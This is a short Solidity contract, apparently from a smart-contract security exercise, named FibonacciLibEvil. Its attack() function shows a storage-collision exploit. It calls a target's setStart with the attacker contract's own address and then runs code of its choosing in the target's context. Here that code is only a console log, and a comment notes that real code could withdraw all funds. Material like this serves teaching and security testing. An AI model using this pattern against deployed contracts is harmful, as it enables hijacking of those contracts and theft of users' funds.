// SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.6;
import "hardhat/console.sol";

// This is a mock library that could contain any malicious code that we can execute in the context
// of fibbonaci Ballance to for example withdraw everything and run any arbitrary code
contract FibonacciLibEvil {
    // initializing the standard Fibonacci sequence
    uint public start;
    uint public calculatedFibNumber;
    function attack(address _target) public {
        (bool success, ) = _target.call(
            abi.encodeWithSignature("setStart(uint256)", address(this))
         );
         require(success);
         (success, ) = _target.call(
            abi.encodeWithSignature("maliciousCode()")
         );
         require(success);
    }

    function maliciousCode() public view {
        console.log("malicious code is running");
    }
}